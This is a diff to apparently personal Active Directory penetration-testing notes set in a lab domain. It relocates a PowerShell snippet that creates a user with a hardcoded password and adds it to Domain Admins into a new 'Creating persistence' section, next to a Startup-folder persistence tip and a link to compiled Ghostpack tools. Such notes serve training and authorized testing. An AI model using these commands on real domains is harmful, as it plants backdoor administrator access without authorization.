@@ -288,7 +288,6 @@ Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNami
 
 ### Enumeration with PowerView
 
-
 ```
 Import-Module .\PowerView.ps1;
 $sid = Convert-NameToSid wley
@@ -537,25 +536,6 @@ The core of this attack involves requesting a Domain Controller to replicate pas
 To execute this attack, the attacker needs control over an account with the necessary permissions for domain replication, namely, a user account with the Replicating Directory Changes and Replicating Directory Changes All permissions enabled.
 
 
-## get admin of DC create another admin user with powershell and active directory
-
-```
-Import-Module ActiveDirectory
-
-$NewUserParams = @{
-    SamAccountName = "ViviG"   # Replace with desired username
-    UserPrincipalName = "VIVIG@INLANEFREIGHT.LOCAL"   # Replace with desired UPN
-    Name = "VivisGhost"          # Replace with desired display name
-    GivenName = "Vivis"                # Replace with desired first name
-    Surname = "Ghost"                # Replace with desired last name
-    AccountPassword = (ConvertTo-SecureString "VIVIG123" -AsPlainText -Force)   # Replace with desired password
-    Enabled = $true
-}
-
-New-ADUser @NewUserParams
-Add-ADGroupMember -Identity "Domain Admins" -Members "ViviG"
-```
-
 
 ### Delete users
 Local
@@ -610,5 +590,38 @@ Find computers
 ```
 Get-ADComputer -Filter {OperatingSystem -like "*Windows Server*"}
 ```
+
+# Creating persistence
+
+## dll highjacking
+
+## startup
+
+will only run when user connects with graphical interface like rpd(wont work if winrm), will not run .ps1 files, only bats or exe.
+
+`C:\Users\blwasp\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+
+## registry
+
+## get admin of DC create another admin user with powershell and active directory
+
+```
+Import-Module ActiveDirectory
+
+$NewUserParams = @{
+    SamAccountName = "ViviG"   # Replace with desired username
+    UserPrincipalName = "VIVIG@INLANEFREIGHT.LOCAL"   # Replace with desired UPN
+    Name = "VivisGhost"          # Replace with desired display name
+    GivenName = "Vivis"                # Replace with desired first name
+    Surname = "Ghost"                # Replace with desired last name
+    AccountPassword = (ConvertTo-SecureString "VIVIG123" -AsPlainText -Force)   # Replace with desired password
+    Enabled = $true
+}
+
+New-ADUser @NewUserParams
+Add-ADGroupMember -Identity "Domain Admins" -Members "ViviG"
+```
+
+
 
 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
